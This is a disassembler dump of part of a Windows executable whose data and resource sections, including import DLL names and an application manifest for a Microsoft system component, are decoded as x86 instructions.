  4033d8:	arpl   WORD PTR [ebp+0x73],sp
  4033db:	jae    0x4033dd
  4033dd:	add    BYTE PTR [ecx+0x70],ah
  4033e0:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  4033ea:	outs   dx,DWORD PTR ds:[esi]
  4033eb:	jb     0x403452
  4033ed:	sub    eax,0x636e7973
  4033f2:	push   0x2d316c2d
  4033f7:	xor    ch,BYTE PTR ds:0x6c642e30
  4033fd:	ins    BYTE PTR es:[edi],dx
  4033fe:	add    BYTE PTR [eax],al
  403400:	popa   
  403401:	jo     0x40346c
  403403:	sub    eax,0x772d736d
  403408:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  40340f:	sub    eax,0x636f7270
  403414:	gs jae 0x40348a
  403417:	je     0x403481
  403419:	jb     0x403480
  40341b:	popa   
  40341c:	fs jae 0x40344c
  40341f:	ins    BYTE PTR es:[edi],dx
  403420:	xor    DWORD PTR ds:0x2e322d31,ebp
  403426:	fs ins BYTE PTR es:[edi],dx
  403428:	ins    BYTE PTR es:[edi],dx
  403429:	add    BYTE PTR [ecx+0x70],ah
  40342c:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  403436:	outs   dx,DWORD PTR ds:[esi]
  403437:	jb     0x40349e
  403439:	sub    eax,0x6f727265
  40343e:	jb     0x4034a8
  403440:	popa   
  403441:	outs   dx,BYTE PTR ds:[esi]
  403442:	fs ins BYTE PTR es:[edi],dx
  403444:	imul   ebp,DWORD PTR [esi+0x67],0x2d316c2d
  40344b:	xor    DWORD PTR ds:0x6c642e31,ebp
  403451:	ins    BYTE PTR es:[edi],dx
  403452:	add    BYTE PTR [eax],al
  403454:	popa   
  403455:	jo     0x4034c0
  403457:	sub    eax,0x772d736d
  40345c:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  403463:	sub    eax,0x7262696c
  403468:	popa   
  403469:	jb     0x4034e4
  40346b:	ins    BYTE PTR es:[edi],dx
  40346c:	outs   dx,DWORD PTR ds:[esi]
  40346d:	popa   
  40346e:	fs gs jb 0x40349f
  403472:	ins    BYTE PTR es:[edi],dx
  403473:	xor    DWORD PTR ds:0x2e302d32,ebp
  403479:	fs ins BYTE PTR es:[edi],dx
  40347b:	ins    BYTE PTR es:[edi],dx
  40347c:	add    BYTE PTR [eax],al
  40347e:	popa   
  40347f:	jo     0x4034ea
  403481:	sub    eax,0x772d736d
  403486:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  40348d:	sub    eax,0x666f7270
  403492:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2d],0x312d316c
  40349a:	sub    eax,0x6c642e30
  40349f:	ins    BYTE PTR es:[edi],dx
  4034a0:	add    BYTE PTR [eax],al
  4034a2:	popa   
  4034a3:	jo     0x40350e
  4034a5:	sub    eax,0x772d736d
  4034aa:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  4034b1:	sub    eax,0x69737973
  4034b6:	outs   dx,BYTE PTR ds:[esi]
  4034b7:	outs   dx,WORD PTR ds:[esi]
  4034b9:	sub    eax,0x322d316c
  4034be:	sub    eax,0x6c642e31
  4034c3:	ins    BYTE PTR es:[edi],dx
	...

Disassembly of section .rsrc:

00404000 <.rsrc>:
	...
  40400c:	add    DWORD PTR [eax],eax
  40400e:	add    al,0x0
  404010:	sub    BYTE PTR [ebx],al
  404012:	add    BYTE PTR [eax-0x7fffffc8],al
  404018:	add    eax,DWORD PTR [eax]
  40401a:	add    BYTE PTR [eax],al
  40401c:	push   eax
  40401d:	add    BYTE PTR [eax],al
  40401f:	or     BYTE PTR [esi],0x0
  404022:	add    BYTE PTR [eax],al
  404024:	mov    al,0x0
  404026:	add    BYTE PTR [eax+0x10],al
  40402c:	enter  0x0,0x80
  404030:	sbb    BYTE PTR [eax],al
  404032:	add    BYTE PTR [eax],al
  404034:	loopne 0x404036
  404036:	add    BYTE PTR [eax+0x0],al
	...
  404044:	add    BYTE PTR [eax],al
  404046:	add    DWORD PTR [eax],eax
  404048:	add    DWORD PTR [eax],eax
  40404a:	add    BYTE PTR [eax],al
  40404c:	clc    
  40404d:	add    BYTE PTR [eax],al
  40404f:	add    BYTE PTR [eax],0x0
	...
  40405e:	or     al,BYTE PTR [eax]
  404060:	add    DWORD PTR [eax],eax
  404062:	add    BYTE PTR [eax],al
  404064:	adc    BYTE PTR [ecx],al
  404066:	add    BYTE PTR [eax+0x2],al
  40406c:	sub    BYTE PTR [ecx],al
  40406e:	add    BYTE PTR [eax+0x3],al
  404074:	inc    eax
  404075:	add    DWORD PTR [eax],eax
  404077:	add    BYTE PTR [eax+eax*1],0x0
  40407b:	add    BYTE PTR [eax+0x1],bl
  40407e:	add    BYTE PTR [eax+0x5],al
  404084:	jo     0x404087
  404086:	add    BYTE PTR [eax+0x6],al
  40408c:	mov    BYTE PTR [ecx],al
  40408e:	add    BYTE PTR [eax+0x7],al
  404094:	mov    al,ds:0x8800001
  404099:	add    BYTE PTR [eax],al
  40409b:	add    BYTE PTR [eax+0x9800001],bh
  4040a1:	add    BYTE PTR [eax],al
  4040a3:	add    al,dl
  4040a5:	add    DWORD PTR [eax],eax
  4040a7:	or     BYTE PTR [edx],0x0
  4040aa:	add    BYTE PTR [eax],al
  4040ac:	call   0xc040b2
	...
  4040bd:	add    BYTE PTR [ecx],al
  4040bf:	add    BYTE PTR [ecx+0x1f],al
  4040c2:	add    BYTE PTR [eax],al
  4040c4:	add    BYTE PTR [edx],al
  4040c6:	add    BYTE PTR [eax+0x0],al
	...
  4040d4:	add    BYTE PTR [eax],al
  4040d6:	add    DWORD PTR [eax],eax
  4040d8:	add    DWORD PTR [eax],eax
  4040da:	add    BYTE PTR [eax],al
  4040dc:	sbb    BYTE PTR [edx],al
  4040de:	add    BYTE PTR [eax+0x0],al
	...
  4040ec:	add    BYTE PTR [eax],al
  4040ee:	add    DWORD PTR [eax],eax
  4040f0:	add    DWORD PTR [eax],eax
  4040f2:	add    BYTE PTR [eax],al
  4040f4:	xor    BYTE PTR [edx],al
  4040f6:	add    BYTE PTR [eax+0x0],al
	...
  404104:	add    BYTE PTR [eax],al
  404106:	add    DWORD PTR [eax],eax
  404108:	or     DWORD PTR [eax+eax*1],eax
  40410b:	add    BYTE PTR [eax+0x2],cl
	...
  40411e:	add    DWORD PTR [eax],eax
  404120:	or     DWORD PTR [eax+eax*1],eax
  404123:	add    BYTE PTR [eax+0x2],bl
	...
  404136:	add    DWORD PTR [eax],eax
  404138:	or     DWORD PTR [eax+eax*1],eax
  40413b:	add    BYTE PTR [eax+0x2],ch
	...
  40414e:	add    DWORD PTR [eax],eax
  404150:	or     DWORD PTR [eax+eax*1],eax
  404153:	add    BYTE PTR [eax+0x2],bh
	...
  404166:	add    DWORD PTR [eax],eax
  404168:	or     DWORD PTR [eax+eax*1],eax
  40416b:	add    BYTE PTR [eax+0x2],cl
	...
  40417d:	add    BYTE PTR [ecx],al
  40417f:	add    BYTE PTR [ecx],cl
  404181:	add    al,0x0
  404183:	add    BYTE PTR [eax+0x2],bl
	...
  404195:	add    BYTE PTR [ecx],al
  404197:	add    BYTE PTR [ecx],cl
  404199:	add    al,0x0
  40419b:	add    BYTE PTR [eax+0x2],ch
	...
  4041ad:	add    BYTE PTR [ecx],al
  4041af:	add    BYTE PTR [ecx],cl
  4041b1:	add    al,0x0
  4041b3:	add    BYTE PTR [eax+0x2],bh
	...
  4041c5:	add    BYTE PTR [ecx],al
  4041c7:	add    BYTE PTR [ecx],cl
  4041c9:	add    al,0x0
  4041cb:	add    al,cl
  4041cd:	add    al,BYTE PTR [eax]
	...
  4041db:	add    BYTE PTR [eax],al
  4041dd:	add    BYTE PTR [ecx],al
  4041df:	add    BYTE PTR [ecx],cl
  4041e1:	add    al,0x0
  4041e3:	add    al,bl
  4041e5:	add    al,BYTE PTR [eax]
	...
  4041f3:	add    BYTE PTR [eax],al
  4041f5:	add    BYTE PTR [ecx],al
  4041f7:	add    BYTE PTR [ecx],cl
  4041f9:	add    al,0x0
  4041fb:	add    al,ch
  4041fd:	add    al,BYTE PTR [eax]
	...
  40420b:	add    BYTE PTR [eax],al
  40420d:	add    BYTE PTR [ecx],al
  40420f:	add    BYTE PTR [ecx],cl
  404211:	add    al,0x0
  404213:	add    al,bh
  404215:	add    al,BYTE PTR [eax]
	...
  404223:	add    BYTE PTR [eax],al
  404225:	add    BYTE PTR [ecx],al
  404227:	add    BYTE PTR [ecx],cl
  404229:	add    al,0x0
  40422b:	add    BYTE PTR [eax],cl
  40422d:	add    eax,DWORD PTR [eax]
	...
  40423b:	add    BYTE PTR [eax],al
  40423d:	add    BYTE PTR [ecx],al
  40423f:	add    BYTE PTR [ecx],cl
  404241:	add    al,0x0
  404243:	add    BYTE PTR [eax],bl
  404245:	add    eax,DWORD PTR [eax]
  404247:	add    al,dl
  404249:	add    WORD PTR [eax],ax
  40424c:	rol    BYTE PTR [eax],1
	...
  404256:	add    BYTE PTR [eax],al
  404258:	cmp    BYTE PTR [eax+0x0],cl
  40425b:	add    BYTE PTR [eax+0x6],ch
	...
  404266:	add    BYTE PTR [eax],al
  404268:	mov    al,ds:0xe800004e
  40426d:	add    al,BYTE PTR [eax]
	...
  404277:	add    BYTE PTR [eax+0x28000051],cl
  40427d:	add    DWORD PTR [eax],eax
	...
  404287:	add    BYTE PTR [eax-0x57ffffae],dh
  40428d:	push   cs
	...
  404296:	add    BYTE PTR [eax],al
  404298:	pop    eax
  404299:	popa   
  40429a:	add    BYTE PTR [eax],al
  40429c:	test   al,0x8
	...
  4042a6:	add    BYTE PTR [eax],al
  4042a8:	add    BYTE PTR [edx+0x0],ch
  4042ab:	add    BYTE PTR [eax+0x5],ch
	...
  4042b6:	add    BYTE PTR [eax],al
  4042b8:	push   0xe800006f
  4042bd:	mov    bh,0x0
	...
  4042c7:	add    BYTE PTR [eax+0x27],dl
  4042ca:	add    DWORD PTR [eax],eax
  4042cc:	test   al,0x25
	...
  4042d6:	add    BYTE PTR [eax],al
  4042d8:	clc    
  4042d9:	dec    esp
  4042da:	add    DWORD PTR [eax],eax
  4042dc:	test   al,0x10
	...
  4042e6:	add    BYTE PTR [eax],al
  4042e8:	mov    al,ds:0x6800015d
  4042ed:	add    al,0x0
	...
  4042f7:	add    BYTE PTR [eax],cl
  4042f9:	bound  eax,QWORD PTR [ecx]
  4042fb:	add    BYTE PTR [edx+0x0],dl
  404301:	add    BYTE PTR [eax],al
  404303:	add    BYTE PTR [eax],al
  404305:	add    BYTE PTR [eax],al
  404307:	add    BYTE PTR [eax+0x30000162],ah
  40430d:	add    al,0x0
	...
  404317:	add    BYTE PTR [eax],dh
  404319:	inc    ebx
  40431a:	add    BYTE PTR [eax],al
  40431c:	add    al,BYTE PTR ds:0x0
  404322:	add    BYTE PTR [eax],al
  404324:	add    BYTE PTR [eax],al
  404326:	add    BYTE PTR [eax],al
  404328:	add    eax,DWORD PTR [eax]
  40432a:	dec    ebp
  40432b:	add    BYTE PTR [ebp+0x0],dl
  40432e:	dec    ecx
  40432f:	add    BYTE PTR [edi+edi*1],bh
  404332:	js     0x4043a1
  404334:	ins    BYTE PTR es:[edi],dx
  404335:	and    BYTE PTR [esi+0x65],dh
  404338:	jb     0x4043ad
  40433a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  404341:	xor    BYTE PTR [edx],ah
  404343:	and    BYTE PTR [ebp+0x6e],ah
  404346:	arpl   WORD PTR [edi+0x64],bp
  404349:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  404350:	inc    esi
  404351:	sub    eax,0x73202238
  404356:	je     0x4043b9
  404358:	outs   dx,BYTE PTR ds:[esi]
  404359:	fs popa 
  40435b:	ins    BYTE PTR es:[edi],dx
  40435c:	outs   dx,DWORD PTR ds:[esi]
  40435d:	outs   dx,BYTE PTR ds:[esi]
  40435e:	gs cmp eax,0x73657922
  404364:	and    bh,BYTE PTR [edi]
  404366:	ds or  eax,0x2d213c0a
  40436c:	sub    eax,0x706f4320
  404371:	jns    0x4043e5
  404373:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40437a:	sub    DWORD PTR [eax],esp
  40437c:	dec    ebp
  40437d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404384:	je     0x4043a6
  404386:	inc    ebx
  404387:	outs   dx,DWORD PTR ds:[esi]
  404388:	jb     0x4043fa
  40438a:	outs   dx,DWORD PTR ds:[esi]
  40438b:	jb     0x4043ee
  40438d:	je     0x4043f8
  40438f:	outs   dx,DWORD PTR ds:[esi]
  404390:	outs   dx,BYTE PTR ds:[esi]
  404391:	and    BYTE PTR ds:0xa0d3e2d,ch
  404397:	cmp    al,0x61
  404399:	jae    0x40440e
  40439b:	gs ins DWORD PTR es:[edi],dx
  40439d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4043a1:	js     0x404410
  4043a3:	ins    BYTE PTR es:[edi],dx
  4043a4:	outs   dx,BYTE PTR ds:[esi]
  4043a5:	jae    0x4043e4
  4043a7:	and    dh,BYTE PTR [ebp+0x72]
  4043aa:	outs   dx,BYTE PTR ds:[esi]
  4043ab:	cmp    dh,BYTE PTR [ebx+0x63]
  4043ae:	push   0x73616d65
  4043b3:	sub    eax,0x7263696d
  4043b8:	outs   dx,DWORD PTR ds:[esi]
  4043b9:	jae    0x40442a
  4043bb:	data16 je 0x4043eb
  4043be:	arpl   WORD PTR [edi+0x6d],bp
  4043c1:	cmp    ah,BYTE PTR [ecx+0x73]
  4043c4:	ins    DWORD PTR es:[edi],dx
  4043c5:	cs jbe 0x4043f9
  4043c8:	and    ah,BYTE PTR [eax]
  4043ca:	and    BYTE PTR [eax+0x6d],bh
  4043cd:	ins    BYTE PTR es:[edi],dx
  4043ce:	outs   dx,BYTE PTR ds:[esi]
  4043cf:	jae    0x40440b
  4043d1:	popa   
  4043d2:	jae    0x404441
  4043d4:	jbe    0x404409
  4043d6:	cmp    eax,0x6e727522
  4043db:	cmp    dh,BYTE PTR [ebx+0x63]
  4043de:	push   0x73616d65
  4043e3:	sub    eax,0x7263696d
  4043e8:	outs   dx,DWORD PTR ds:[esi]
  4043e9:	jae    0x40445a
  4043eb:	data16 je 0x40441b
  4043ee:	arpl   WORD PTR [edi+0x6d],bp
  4043f1:	cmp    ah,BYTE PTR [ecx+0x73]
  4043f4:	ins    DWORD PTR es:[edi],dx
  4043f5:	cs jbe 0x40442b
  4043f8:	and    ah,BYTE PTR [eax]
  4043fa:	ins    DWORD PTR es:[edi],dx
  4043fb:	popa   
  4043fc:	outs   dx,BYTE PTR ds:[esi]
  4043fd:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  404404:	jb     0x404479
  404406:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40440d:	xor    BYTE PTR [edx],ah
  40440f:	ds or  eax,0x73613c0a
  404415:	jae    0x40447c
  404417:	ins    DWORD PTR es:[edi],dx
  404418:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40441c:	fs outs dx,BYTE PTR gs:[esi]
  40441f:	je     0x40448a
  404421:	je     0x40449c
  404423:	or     eax,0x7270090a
  404428:	outs   dx,DWORD PTR ds:[esi]
  404429:	arpl   WORD PTR [ebp+0x73],sp
  40442c:	jae    0x40449d
  40442e:	jb     0x404471
  404430:	jb     0x404495
  404432:	push   0x63657469
  404437:	je     0x4044ae
  404439:	jb     0x4044a0
  40443b:	cmp    eax,0x36387822
  404440:	and    cl,BYTE PTR ds:0x6576090a
  404446:	jb     0x4044bb
  404448:	imul   ebp,DWORD PTR [edi+0x6e],0x2e35223d
  40444f:	xor    DWORD PTR [esi],ebp
  404451:	xor    BYTE PTR [esi],ch
  404453:	xor    BYTE PTR [edx],ah
  404455:	or     eax,0x616e090a
  40445a:	ins    DWORD PTR es:[edi],dx
  40445b:	gs cmp eax,0x63694d22
  404461:	jb     0x4044d2
  404463:	jae    0x4044d4
  404465:	data16 je 0x404496
  404468:	push   edi
  404469:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  404470:	push   ebx
  404471:	jns    0x4044e6
  404473:	je     0x4044da
  404475:	ins    DWORD PTR es:[edi],dx
  404476:	push   eax
  404477:	jb     0x4044e8
  404479:	jo     0x4044e0
  40447b:	jb     0x4044f1
  40447d:	imul   esp,DWORD PTR [ebp+0x73],0x61746144
  404484:	inc    ebp
  404485:	js     0x4044ec
  404487:	arpl   WORD PTR [ebp+0x74],si
  40448a:	imul   ebp,DWORD PTR [edi+0x6e],0x76657250
  404491:	outs   dx,BYTE PTR gs:[esi]
  404493:	je     0x4044fe
  404495:	outs   dx,DWORD PTR ds:[esi]
  404496:	outs   dx,BYTE PTR ds:[esi]
  404497:	and    ah,BYTE PTR [eax]
  404499:	je     0x404514
  40449b:	jo     0x404502
  40449d:	cmp    eax,0x6e697722
  4044a2:	xor    esi,DWORD PTR [edx]
  4044a4:	and    ah,BYTE PTR [eax]
  4044a6:	das    
  4044a7:	ds or  eax,0x65643c0a
  4044ad:	jae    0x404512
  4044af:	jb     0x40451a
  4044b1:	jo     0x404527
  4044b3:	imul   ebp,DWORD PTR [edi+0x6e],0x7379533e
  4044ba:	je     0x404521
  4044bc:	ins    DWORD PTR es:[edi],dx
  4044bd:	and    BYTE PTR [eax+0x72],dl
  4044c0:	outs   dx,DWORD PTR ds:[esi]
  4044c1:	jo     0x404528
  4044c3:	jb     0x404539
  4044c5:	imul   esp,DWORD PTR [ebp+0x73],0x74614420
  4044cc:	popa   
  4044cd:	and    BYTE PTR [ebp+0x78],al
  4044d0:	arpl   WORD PTR gs:[ebp+0x74],si
  4044d4:	imul   ebp,DWORD PTR [edi+0x6e],0x65725020
  4044db:	jbe    0x404542
  4044dd:	outs   dx,BYTE PTR ds:[esi]
  4044de:	je     0x404549
  4044e0:	outs   dx,DWORD PTR ds:[esi]
  4044e1:	outs   dx,BYTE PTR ds:[esi]
  4044e2:	cmp    al,0x2f
  4044e4:	fs gs jae 0x40454b
  4044e8:	jb     0x404553
  4044ea:	jo     0x404560
  4044ec:	imul   ebp,DWORD PTR [edi+0x6e],0x3c0a0d3e
  4044f3:	fs gs jo 0x40455c
  4044f7:	outs   dx,BYTE PTR ds:[esi]
  4044f8:	fs outs dx,BYTE PTR gs:[esi]
  4044fb:	arpl   WORD PTR [ecx+0x3e],di
  4044fe:	or     eax,0x2020200a
  404503:	and    BYTE PTR [esp+eiz*2],bh
  404506:	gs jo  0x40456e
  404509:	outs   dx,BYTE PTR ds:[esi]
  40450a:	fs outs dx,BYTE PTR gs:[esi]
  40450d:	je     0x404550
  40450f:	jae    0x404584
  404511:	gs ins DWORD PTR es:[edi],dx
  404513:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404517:	or     eax,0x2020200a
  40451c:	and    BYTE PTR [eax],ah
  40451e:	and    BYTE PTR [eax],ah
  404520:	and    BYTE PTR [ecx+eiz*2],bh
  404523:	jae    0x404598
  404525:	gs ins DWORD PTR es:[edi],dx
  404527:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40452b:	fs outs dx,BYTE PTR gs:[esi]
  40452e:	je     0x404599
  404530:	je     0x4045ab
  404532:	or     eax,0x2020200a
  404537:	and    BYTE PTR [eax],ah
  404539:	and    BYTE PTR [eax],ah
  40453b:	and    BYTE PTR [eax],ah
  40453d:	and    BYTE PTR [eax],ah
  40453f:	and    BYTE PTR [ecx+edi*2+0x70],dh
  404543:	gs cmp eax,0x6e697722
  404549:	xor    esi,DWORD PTR [edx]
  40454b:	and    cl,BYTE PTR ds:0x2020200a
  404551:	and    BYTE PTR [eax],ah
  404553:	and    BYTE PTR [eax],ah
  404555:	and    BYTE PTR [eax],ah
  404557:	and    BYTE PTR [eax],ah
  404559:	and    BYTE PTR [esi+0x61],ch
  40455c:	ins    DWORD PTR es:[edi],dx
  40455d:	gs cmp eax,0x63694d22
  404563:	jb     0x4045d4
  404565:	jae    0x4045d6
  404567:	data16 je 0x404598
  40456a:	push   edi
  40456b:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  404572:	inc    ebx
  404573:	outs   dx,DWORD PTR ds:[esi]
  404574:	ins    DWORD PTR es:[edi],dx
  404575:	ins    DWORD PTR es:[edi],dx
  404576:	outs   dx,DWORD PTR ds:[esi]
  404577:	outs   dx,BYTE PTR ds:[esi]
  404578:	sub    eax,0x746e6f43
  40457d:	jb     0x4045ee
  40457f:	ins    BYTE PTR es:[edi],dx
  404580:	jae    0x4045a4
  404582:	or     eax,0x2020200a
  404587:	and    BYTE PTR [eax],ah
  404589:	and    BYTE PTR [eax],ah
  40458b:	and    BYTE PTR [eax],ah
  40458d:	and    BYTE PTR [eax],ah
  40458f:	and    BYTE PTR [esi+0x65],dh
  404592:	jb     0x404607
  404594:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
  40459b:	xor    BYTE PTR [esi],ch
  40459d:	xor    BYTE PTR [esi],ch
  40459f:	xor    BYTE PTR [edx],ah
  4045a1:	or     eax,0x2020200a
  4045a6:	and    BYTE PTR [eax],ah
  4045a8:	and    BYTE PTR [eax],ah
  4045aa:	and    BYTE PTR [eax],ah
  4045ac:	and    BYTE PTR [eax],ah
  4045ae:	and    BYTE PTR [eax+0x75],dh
  4045b1:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  4045b5:	dec    ebx
  4045b6:	gs jns 0x40460d
  4045b9:	outs   dx,DWORD PTR ds:[esi]
  4045ba:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4045be:	and    dh,BYTE PTR [esi]
  4045c0:	xor    eax,0x36623539
  4045c5:	xor    al,0x31
  4045c7:	xor    al,0x34
  4045c9:	arpl   WORD PTR [ebx+0x66],sp
  4045cc:	xor    DWORD PTR [esi+eiz*2+0x22],esp
  4045d0:	or     eax,0x2020200a
  4045d5:	and    BYTE PTR [eax],ah
  4045d7:	and    BYTE PTR [eax],ah
  4045d9:	and    BYTE PTR [eax],ah
  4045db:	and    BYTE PTR [eax],ah
  4045dd:	and    BYTE PTR [eax+0x72],dh
  4045e0:	outs   dx,DWORD PTR ds:[esi]
  4045e1:	arpl   WORD PTR [ebp+0x73],sp
  4045e4:	jae    0x404655
  4045e6:	jb     0x404629
  4045e8:	jb     0x40464d
  4045ea:	push   0x63657469
  4045ef:	je     0x404666
  4045f1:	jb     0x404658
  4045f3:	cmp    eax,0x36387822
  4045f8:	and    cl,BYTE PTR ds:0x2020200a
  4045fe:	and    BYTE PTR [eax],ah
  404600:	and    BYTE PTR [eax],ah
  404602:	and    BYTE PTR [edi],ch
  404604:	ds or  eax,0x2020200a
  40460a:	and    BYTE PTR [edi+ebp*1],bh
  40460d:	fs gs jo 0x404676
  404611:	outs   dx,BYTE PTR ds:[esi]
  404612:	fs outs dx,BYTE PTR gs:[esi]
  404615:	je     0x404658
  404617:	jae    0x40468c
  404619:	gs ins DWORD PTR es:[edi],dx
  40461b:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40461f:	or     eax,0x642f3c0a
  404624:	gs jo  0x40468c
  404627:	outs   dx,BYTE PTR ds:[esi]
  404628:	fs outs dx,BYTE PTR gs:[esi]
  40462b:	arpl   WORD PTR [ecx+0x3e],di
  40462e:	or     eax,0x72743c0a
  404633:	jne    0x4046a8
  404635:	je     0x404680
  404637:	outs   dx,BYTE PTR ds:[esi]
  404638:	outs   dx,WORD PTR ds:[esi]
  40463a:	and    BYTE PTR [eax+0x6d],bh
  40463d:	ins    BYTE PTR es:[edi],dx
  40463e:	outs   dx,BYTE PTR ds:[esi]
  40463f:	jae    0x40467e
  404641:	and    dh,BYTE PTR [ebp+0x72]
  404644:	outs   dx,BYTE PTR ds:[esi]
  404645:	cmp    dh,BYTE PTR [ebx+0x63]
  404648:	push   0x73616d65
  40464d:	sub    eax,0x7263696d
  404652:	outs   dx,DWORD PTR ds:[esi]
  404653:	jae    0x4046c4
  404655:	data16 je 0x404685
  404658:	arpl   WORD PTR [edi+0x6d],bp
  40465b:	cmp    ah,BYTE PTR [ecx+0x73]
  40465e:	ins    DWORD PTR es:[edi],dx
  40465f:	cs jbe 0x404695
  404662:	and    bh,BYTE PTR [esi]
  404664:	or     eax,0x2020200a
  404669:	and    BYTE PTR [ebx+esi*2],bh
  40466c:	arpl   WORD PTR gs:[ebp+0x72],si
  404670:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  404678:	and    BYTE PTR [eax],ah
  40467a:	and    BYTE PTR [eax],ah
  40467c:	and    BYTE PTR [eax],ah
  40467e:	cmp    al,0x72
  404680:	gs jno 0x4046f8
  404683:	gs jae 0x4046fa
  404686:	gs fs push eax
  404689:	jb     0x4046f4
  40468b:	jbe    0x4046f6
  40468d:	ins    BYTE PTR es:[edi],dx
  40468e:	gs addr16 gs jae 0x4046d1
  404693:	or     eax,0x2020200a
  404698:	and    BYTE PTR [eax],ah
  40469a:	and    BYTE PTR [eax],ah
  40469c:	and    BYTE PTR [eax],ah
  40469e:	and    BYTE PTR [eax],ah
  4046a0:	and    BYTE PTR [edx+esi*2],bh
  4046a3:	gs jno 0x40471b
  4046a6:	gs jae 0x40471d
  4046a9:	gs fs inc ebp
  4046ac:	js     0x404713
  4046ae:	arpl   WORD PTR [ebp+0x74],si
  4046b1:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  4046b8:	ins    BYTE PTR es:[edi],dx
  4046b9:	or     eax,0x2020200a
  4046be:	and    BYTE PTR [eax],ah
  4046c0:	and    BYTE PTR [eax],ah
  4046c2:	and    BYTE PTR [eax],ah
  4046c4:	and    BYTE PTR [eax],ah
  4046c6:	and    BYTE PTR [eax],ah
  4046c8:	and    BYTE PTR [eax],ah
  4046ca:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  4046ce:	gs ins BYTE PTR es:[edi],dx
  4046d0:	cmp    eax,0x71657222
  4046d5:	jne    0x404740
  4046d7:	jb     0x40473e
  4046d9:	inc    ecx
  4046da:	fs ins DWORD PTR es:[edi],dx
  4046dc:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  4046e3:	je     0x404754
  4046e5:	jb     0x404709
  4046e7:	or     eax,0x2020200a
  4046ec:	and    BYTE PTR [eax],ah
  4046ee:	and    BYTE PTR [eax],ah
  4046f0:	and    BYTE PTR [eax],ah
  4046f2:	and    BYTE PTR [eax],ah
  4046f4:	and    BYTE PTR [eax],ah
  4046f6:	and    BYTE PTR [eax],ah
  4046f8:	and    BYTE PTR [ebp+0x69],dh
  4046fb:	inc    ecx
  4046fc:	arpl   WORD PTR [ebx+0x65],sp
  4046ff:	jae    0x404774
  404701:	cmp    eax,0x6c616622
  404706:	jae    0x40476d
  404708:	and    cl,BYTE PTR ds:0x2020200a
  40470e:	and    BYTE PTR [eax],ah
  404710:	and    BYTE PTR [eax],ah
  404712:	and    BYTE PTR [eax],ah
  404714:	and    BYTE PTR [eax],ah
  404716:	and    BYTE PTR [edi],ch
  404718:	ds or  eax,0x2020200a
  40471e:	and    BYTE PTR [eax],ah
  404720:	and    BYTE PTR [eax],ah
  404722:	and    BYTE PTR [edi+ebp*1],bh
  404725:	jb     0x40478c
  404727:	jno    0x40479e
  404729:	gs jae 0x4047a0
  40472c:	gs fs push eax
  40472f:	jb     0x40479a
  404731:	jbe    0x40479c
  404733:	ins    BYTE PTR es:[edi],dx
  404734:	gs addr16 gs jae 0x404777
  404739:	or     eax,0x2020200a
  40473e:	and    BYTE PTR [edi+ebp*1],bh
  404741:	jae    0x4047a8
  404743:	arpl   WORD PTR [ebp+0x72],si
  404746:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x2f3c0a0d
  40474e:	je     0x4047c2
  404750:	jne    0x4047c5
  404752:	je     0x40479d
  404754:	outs   dx,BYTE PTR ds:[esi]
  404755:	outs   dx,WORD PTR ds:[esi]
  404757:	ds or  eax,0x73613c0a
  40475d:	ins    DWORD PTR es:[edi],dx
  40475e:	jbe    0x404793
  404760:	cmp    ah,BYTE PTR [ecx+0x70]
  404763:	jo     0x4047d1
  404765:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40476c:	ds or  eax,0x2020200a
  404772:	cmp    al,0x61
  404774:	jae    0x4047e3
  404776:	jbe    0x4047ab
  404778:	cmp    dh,BYTE PTR [edi+0x69]
  40477b:	outs   dx,BYTE PTR ds:[esi]
  40477c:	outs   dx,DWORD PTR fs:[esi]
  40477e:	ja     0x4047f3
  404780:	push   ebx
  404781:	gs je  0x4047f8
  404784:	imul   ebp,DWORD PTR [esi+0x67],0x6d782073
  40478b:	ins    BYTE PTR es:[edi],dx
  40478c:	outs   dx,BYTE PTR ds:[esi]
  40478d:	jae    0x4047cc
  40478f:	and    ch,BYTE PTR [eax+0x74]
  404792:	je     0x404804
  404794:	cmp    ch,BYTE PTR [edi]
  404796:	das    
  404797:	jae    0x4047fc
  404799:	push   0x73616d65
  40479e:	cs ins DWORD PTR es:[edi],dx
  4047a0:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4047a7:	je     0x4047d7
  4047a9:	arpl   WORD PTR [edi+0x6d],bp
  4047ac:	das    
  4047ad:	push   ebx
  4047ae:	dec    ebp
  4047af:	dec    ecx
  4047b0:	das    
  4047b1:	xor    dh,BYTE PTR [eax]
  4047b3:	xor    BYTE PTR ds:0x6e69572f,dh
  4047b9:	outs   dx,DWORD PTR fs:[esi]
  4047bb:	ja     0x404830
  4047bd:	push   ebx
  4047be:	gs je  0x404835
  4047c1:	imul   ebp,DWORD PTR [esi+0x67],0xd3e2273
  4047c8:	or     ah,BYTE PTR [eax]
  4047ca:	and    BYTE PTR [eax],ah
  4047cc:	and    BYTE PTR [eax],ah
  4047ce:	and    BYTE PTR [eax],ah
